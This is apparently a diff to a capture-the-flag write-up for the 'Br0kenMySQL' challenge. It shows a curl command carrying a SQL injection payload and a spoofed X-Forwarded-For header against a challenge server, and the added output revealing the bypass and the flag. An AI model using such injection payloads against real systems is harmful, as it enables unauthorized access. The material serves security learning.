@@ -52,10 +52,6 @@ if (!mysqli_select_db($link,MYSQL_USER)) {
     } else {
         echo "Hello ".$username;
     }
-
-
-
-
 ?>
 </h1>
 </pre>
@@ -69,4 +65,13 @@ ORDER BY id DESC LIMIT 1) LIMIT 1
 
 $ curl --header "X-Forwarded-For: 865749654"
 "http://139.59.239.133/?id=2%20or%20id=(SELECT%201%20FROM%20logs%20WHERE%20ip=865749654%20ORDER%20BY%20id%20DESC%20LIMIT%201)%20LIMIT%201"
+```
+```html
+<title>Br0kenMySQL</title><h1><pre>
+<p style='color:Red'>Br0kenMySQL</p>
+string(8) "86574965"
+What ???????
+Login as guest&admin at the same time ?
+Seems our code is broken, here is your bounty
+MeePwnCTF{_b4by_tr1ck_fixed}
 ```
